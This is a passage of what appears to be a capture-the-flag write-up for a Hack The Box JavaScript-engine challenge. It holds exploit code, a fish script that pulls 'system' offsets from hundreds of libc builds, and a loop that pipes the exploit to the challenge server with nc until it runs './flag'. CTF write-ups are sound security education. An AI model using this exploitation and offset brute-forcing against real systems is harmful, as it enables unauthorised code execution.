+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">20</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
+<span class="w">        </span><span class="ow">new</span><span class="w"> </span><span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x1000000</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</pre></div>
+<p>Now we just need to run:</p>
+<div class="highlight"><pre><span></span><span class="nx">exploit</span><span class="p">();</span><span class="w"></span>
+<span class="nx">gc</span><span class="p">();</span><span class="w"></span>
+</pre></div>
+<p>And after 6 or so attempts, it works!</p>
+<p><img alt="" class="pure-img" src="../../images/f4322b98-d208-47c1-87af-8a57542144f1.png"/></p>
+<p>So we have the exploit working on our local system, where we know what version
+of libc we're using and can read the offset of <code>system</code>, but for the challenge
+we don't know which libc version is being used, I started by trying with the
+offsets of <code>system</code> in some common docker images such as <code>ubuntu:20.10</code>,
+<code>ubuntu:20.04</code>, but none of these worked. So I used
+<a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a> to download 392 versions of libc, and
+used the following fish script to extract the offsets of <code>system</code> from all of them:</p>
+<div class="highlight"><pre><span></span><span class="k">for</span> f <span class="k">in</span> db/*.so
+    objdump <span class="nv">$f</span> -T <span class="o">|</span> grep <span class="s2">"\bsystem\b"</span> <span class="o">|</span> awk <span class="s1">'{print $1}'</span> <span class="o">|</span> sed <span class="s1">'s/^0*//'</span> <span class="o">&gt;&gt;</span> offsets_to_try
+<span class="k">end</span>
+</pre></div>
+<p>I then modified the pwn script to correct for a given <code>system</code> offset:</p>
+<div class="highlight"><pre><span></span><span class="kd">var</span><span class="w"> </span><span class="nx">system_offset_me</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x4a830n</span><span class="p">;</span><span class="w"></span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">system_offset_them</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">THEOFFSET</span><span class="p">;</span><span class="w"></span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">offset_from_my_system</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">system_offset_them</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">system_offset_me</span><span class="p">;</span><span class="w"></span>
+
+<span class="kd">var</span><span class="w"> </span><span class="nx">system_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">libcptr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">system_offset_from_libc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">offset_from_my_system</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">random_offset</span><span class="p">;</span><span class="w"></span>
+</pre></div>
+<p>Then I minified my script and wrote a fish script to attempt each of these offsets:</p>
+<div class="highlight"><pre><span></span><span class="k">while</span> <span class="nb">read</span> -la offset
+    cat pwn.js <span class="o">|</span> sed <span class="o">(</span><span class="nb">printf</span> <span class="s2">"s/THEOFFSET/0x%sn/"</span> <span class="nv">$offset</span><span class="o">)</span> <span class="o">&gt;</span> pwn_.js
+    <span class="k">echo</span> <span class="s2">"offset: "</span> <span class="nv">$offset</span>
+    <span class="k">for</span> i <span class="k">in</span> <span class="o">(</span>seq 20<span class="o">)</span>
+        cat pwn_.js <span class="o">|</span> nc docker.hackthebox.eu 32429
+    <span class="k">end</span>
+<span class="k">end</span> <span class="o">&lt;</span> offsets_to_try
+</pre></div>
+<p><img alt="" class="pure-img" src="../../images/d2504d07-330d-47fd-8c27-3820a5821536.png"/></p>
+<p>After some attempts I found that offset <code>0x35fd0</code> worked, and I modified my
+script to execute <code>/bin/cat flag</code> instead, though for some reason 'flag' was an
+executable file (maybe I was meant to solve this another way), so I again
+modified the exploit to run <code>./flag</code> and ran it, now we have our flag:</p>
+<p><img alt="" class="pure-img" src="../../images/83302814-efb7-4ad0-b8e7-9a24c414bf9a.png"/></p>
+</main>
+</div>
+</div>
+</div>
+</body>
+</html>
